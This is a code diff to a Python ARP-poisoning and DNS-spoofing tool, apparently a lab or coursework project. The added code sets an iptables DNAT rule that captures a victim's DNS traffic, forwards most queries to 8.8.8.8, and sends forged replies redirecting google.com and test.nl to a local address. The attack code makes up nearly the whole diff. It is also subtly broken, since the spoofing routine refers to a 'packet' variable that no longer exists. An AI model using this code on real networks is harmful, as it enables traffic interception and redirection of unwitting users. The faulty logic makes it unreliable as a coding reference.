@@ -255,6 +255,7 @@ class ARPP(object):
             switch (int): 1 to turn IP forwarding on, 0 to turn IP forwarding off.
         """
         # the following path points to a file containing a 1 if ip_routing is enabled and 0 otherwise
+        # have to be root to perform this operation
         path = "/proc/sys/net/ipv4/ip_forward"
         with open(path) as f:
             if f.read()=="{}".format(switch):
@@ -291,7 +292,7 @@ class ARPP(object):
                 else:
                     print("[+] IP forwarding already turned on")
             elif switch == 0:
-                print("[i] Turning IP forwaring off...")
+                print("[i] Turning IP forwarding off...")
                 # if status is 4 then it's on, and we must want to turn it off
                 if status == 4: 
                     win32serviceutil.StopService(service_name)
@@ -429,6 +430,9 @@ class ARPP(object):
         """
         self._assure_interface_is_selected()
         
+        # Route UDP packets on port 53 (which includes DNS requests) to 127.0.0.1 which is the local DNS server. 
+        os.system("iptables -t nat -A PREROUTING -p udp --dport 53 -j DNAT --to 127.0.0.1")
+        
         # get IP of victim as input
         answer = ""
         try:
@@ -449,15 +453,28 @@ class ARPP(object):
         # a dictionary of sites that if the victim tries to access them they are directed to the wrong IP address
         target_sites = {"google.com.":"192.168.178.217",\
             "test.nl":"192.168.178.217"}
+        loc_dns = "127.0.0.1" # corresponding to iptable ip address that packet is routed to
         
         # this function is called on each packet in the sniff call further ahead
-        def packet_callback(packet):
+        def packet_callback(loc_dns_server):
+            def forward_dns(pkt):
+                print(f"Forwarding: {pkt[DNSQR].qname}")
+                response = sr1(
+                    IP(dst='8.8.8.8')/
+                        UDP(sport=pkt[UDP].sport)/
+                        DNS(rd=1, id=pkt[DNS].id, qd=DNSQR(qname=pkt[DNSQR].qname)),
+                    verbose=0,
+                )
+                resp_pkt = IP(dst=pkt[IP].src, src=loc_dns_server)/UDP(dport=pkt[UDP].sport)/DNS()
+                resp_pkt[DNS] = response[DNS]
+                send(resp_pkt, verbose=0)
+                return f"Responding to {pkt[IP].src}"
             # this is just for debugging purposes on the linux machine
             # if DNS in packet and DNSQR in packet and IP in packet and packet[IP].src == ipVictim:
             #     print("DNS in packet: {}".format(DNS in packet)) 
             #     print("DNS request for targeted site: {}".format(any([target_site in str(packet[DNSQR].qname) for target_site in target_sites.keys()]) ))
             #     print("Packet operation code is 0: {}".format(packet[DNS].opcode==0))
-            def send_spoofed_response():
+            def send_spoofed_response(pkt):
                 # first we check if the packet is one that needs to be spoofed
                 if  (DNS in packet)\
                         and (IP in packet)\
@@ -483,14 +500,17 @@ class ARPP(object):
                     # send the fake packet on the selected interface
                     send(fake_DNS_reply, iface=self.SELECTED_INTERFACE, verbose=0)
                     print("[+] Sent fake DNS reply to {} for {}".format(packet[IP].src, packet[DNSQR].qname.decode("utf-8")))
-            send_spoofed_response()
+                else:
+                    forward_dns(pkt)
+            
+            return send_spoofed_response
                         
         # in order to keep the GUI running for the user of this script, we create a thread that executes the DNS spoofing
         # the threading.Event() is used to stop the thread when the user wants (by using e.set())
         e=threading.Event()
         def rec(event):
             while True:
-                sniff(timeout=5, prn=packet_callback, count=10)
+                sniff(timeout=5, prn=packet_callback(loc_dns), count=10) # packet_callback(loc_dns) becomes send_spoofed_response and get packet as input making this code work 
                 if event.is_set():
                     break
         
